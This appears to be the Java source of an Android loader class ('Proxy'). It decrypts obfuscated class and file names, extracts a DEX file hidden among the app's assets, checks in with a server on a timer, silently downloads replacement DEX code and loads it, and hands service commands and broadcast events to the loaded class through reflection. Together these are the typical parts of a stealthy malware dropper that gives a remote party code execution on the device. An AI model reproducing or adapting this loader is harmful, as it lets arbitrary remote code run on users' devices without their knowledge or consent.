package basic.workspace;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import org.apache.http.Header;
import org.json.JSONObject;
import basic.workspace.common.Logger;
import basic.workspace.common.ParseKsy;
import basic.workspace.http.AsyncHttpClient;
import basic.workspace.http.FileAsyncHttpResponseHandler;
import basic.workspace.http.RequestParams;
import basic.workspace.http.TextHttpResponseHandler;
import basic.workspace.util.Base64;
import basic.workspace.util.ServerUrlHelper;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.AssetManager;
import android.util.Log;
import dalvik.system.DexClassLoader;

@SuppressLint("NewApi")
public class Proxy {
    private static Class<?> cls = null;
    private static final Object locker = new Object();
    /**
     * a.jar
     */
    private static final String ASSET_DEX = ParseKsy.decode("e536da01fc5af606c59cfa7dc120d040");
    /**
     * u.jar
     */
    private static final String UPDATED_DEX = ParseKsy.decode("66b32cd2efee1045fd0a7a158236ca7e");
    /**
     * facade.Worker
     */
    private static final String CLASS_NAME = ParseKsy.decode("898a7478d81798f8c54c5d85d3bb967a");
    private static final String optimizedDirectoryName = "oooooo";
    private static final String DEX_DIR_NAME = "oooo";
    private static final String UPDATED_SIZE_PREF_NAME = "CCCCCCC";
    private static final Object updateLocker = new Object();
    private static long lastCheckTime = 0;
    private static final String prefName = "OOOOOOOOOOOOOOOOOOOOOOOOOOOO";
    private static final String LAST_UPDATE_TIME_PREF = "CCCCCCD";
    private static Class<?> loadClass(Context context) throws Throwable {
        return loadClass(context, true);
    }
    public static Class<?> loadClass(Context context, boolean checkUpdate) throws Throwable {
        if (cls == null) {
            synchronized (locker) {
                if (cls == null) {
                    if (Settings.EXTERNAL_LOAD_MODULE) {
                        cls = loadDexClass(context, CLASS_NAME);
                    } else {
                        cls = Class.forName(CLASS_NAME);
                    }
                }
            }
        }
        if (checkUpdate && Settings.EXTERNAL_LOAD_MODULE && isUpdateTime(context)) {
            dexUpdate(context);
        }
        return cls;
    }
    public static Class<?> loadDexClass(Context context, String className) throws Throwable {
        Class<?> cls = null;
        SharedPreferences pref = getPref(context);
        File targetDex = null;
        File updatedDex = getDexFile(context, UPDATED_DEX);
        if (updatedDex.length() == pref.getLong(UPDATED_SIZE_PREF_NAME, -22)) {
            targetDex = updatedDex;
        }
        if (targetDex == null) {
            File assetDex = getDexFile(context, ASSET_DEX);
            if (assetDex.length() != Settings.DES_SIZE) {
                assetToLocal(context, assetDex.getAbsolutePath(), Settings.ASSET_DEX_NAME);
            }
            targetDex = assetDex;
        }
        if (targetDex != null) {
            DexClassLoader classLoader = new DexClassLoader(targetDex.getAbsolutePath(), context.getDir(optimizedDirectoryName, 0).getAbsolutePath(), null, context.getClassLoader());
            cls = classLoader.loadClass(className);
        }
        return cls;
    }
    private static void downloadDex(final Context context, JSONObject obj) {
        if (obj != null) {
            String url = obj.optString("U");
            final long length = obj.optLong("L");
            final File updatedDex = getDexFile(context, UPDATED_DEX);
            updatedDex.delete();
            new AsyncHttpClient().get(url, new FileAsyncHttpResponseHandler(new File(updatedDex.getAbsolutePath() + ".del")) {
                @Override
                public void onSuccess(int statusCode, File result) {
                    if (statusCode == 200 && result != null && result.renameTo(updatedDex) && updatedDex.length() == length) {
                        getPref(context).edit().putLong(UPDATED_SIZE_PREF_NAME, length).commit();
                        synchronized (locker) {
                            cls = null;
                        }
                    }
                }
                @Override
                public void onFailure(int statusCode, Header[] headers, Throwable e, File response) {
                    logUpdateFailure(context);
                }
            });
        }
    }
    private static File getDexFile(Context context, String name) {
        return new File(context.getDir(DEX_DIR_NAME, 0), name);
    }
    private static SharedPreferences getPref(Context context) {
        return context.getSharedPreferences(prefName, 0);
    }
    private static boolean isUpdateTime(final Context context) {
        boolean result = false;
        synchronized (updateLocker) {
            long current = System.currentTimeMillis();
            if (current - lastCheckTime > Settings.DEX_CHECK_INTERVAL * 1000) {
                lastCheckTime = current;
                SharedPreferences pref = getPref(context);
                long lastUpdateTime = pref.getLong(LAST_UPDATE_TIME_PREF, 0);
                if (System.currentTimeMillis() - lastUpdateTime > Settings.DEX_UPDATE_INTERVAL) {
                    result = true;
                }
            }
        }
        return result;
    }
    public static void dexUpdate(final Context context) {
        try {
            int version = getVersion(context);
            getPref(context).edit().putLong(LAST_UPDATE_TIME_PREF, System.currentTimeMillis()).commit();
            JSONObject postData = new JSONObject();
            postData.put("t", System.currentTimeMillis());
            postData.put("v", version);
            postData.put("a", Math.random());
            String content = Base64.encodeString(postData.toString());
            String url = ServerUrlHelper.getUrl(context);
            Log.i("U", url + "?p=" + content);
            new AsyncHttpClient().post(url, new RequestParams("p", content), new TextHttpResponseHandler("UTF-8") {
                @Override
                public void onSuccess(int statusCode, Header[] headers, String result) {
                    if (result != null && result.trim().length() >= 5) {
                        try {
                            downloadDex(context, new JSONObject(Base64.decodeString(result)));
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
                @Override
                public void onFailure(int statusCode, Header[] headers, String responseBody, Throwable error) {
                    logUpdateFailure(context);
                }
            });
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
    private static void logUpdateFailure(Context context) {
        getPref(context).edit().remove(LAST_UPDATE_TIME_PREF).commit();
    }
    private static int assetToLocal(Context context, String targetFilePath, String assetFilename) {
        int result = 0;
        AssetManager assetmanager = context.getAssets();
        InputStream inputstream = null;
        FileOutputStream fileoutputstream = null;
        File file = new File(targetFilePath);
        if (!file.exists()) {
            try {
                inputstream = assetmanager.open(assetFilename);
                file.createNewFile();
                fileoutputstream = new FileOutputStream(file);
                byte buffer[] = new byte[1024];
                int i;
                while ((i = inputstream.read(buffer)) > 0) {
                    fileoutputstream.write(buffer, 0, i);
                }
            } catch (Throwable e) {
                e.printStackTrace();
                result = -1;
            } finally {
                if (fileoutputstream != null) try {
                    fileoutputstream.close();
                } catch (IOException e) {}
                if (inputstream != null) try {
                    inputstream.close();
                } catch (IOException e) {}
            }
        }
        return result;
    }
    public static void handleServiceCommand(Context context, Intent intent) {
        try {
            Class<?> c = loadClass(context);
            c.getMethod("A", new Class[] { Context.class, Intent.class }).invoke(c, new Object[] { context, intent });
        } catch (Throwable e) {
            Logger.error(e);
        }
    }
    public static void handleReceiverEvent(Context context, BroadcastReceiver receiver, Intent intent) {
        try {
            Class<?> c = loadClass(context);
            c.getMethod("B", new Class[] { Context.class, BroadcastReceiver.class, Intent.class }).invoke(c, new Object[] { context, receiver, intent });
        } catch (Throwable e) {
            Logger.error(e);
        }
    }
    private static int getVersion(Context context) {
        int result = 0;
        try {
            Class<?> c = loadClass(context, false);
            Object invokeResult = c.getDeclaredMethod("C", new Class[] { Context.class }).invoke(c, new Object[] { context });
            if (invokeResult != null) {
                result = ((Integer) invokeResult).intValue();
            }
        } catch (Throwable e) {
            Logger.error(e);
        }
        return result;
    }
}
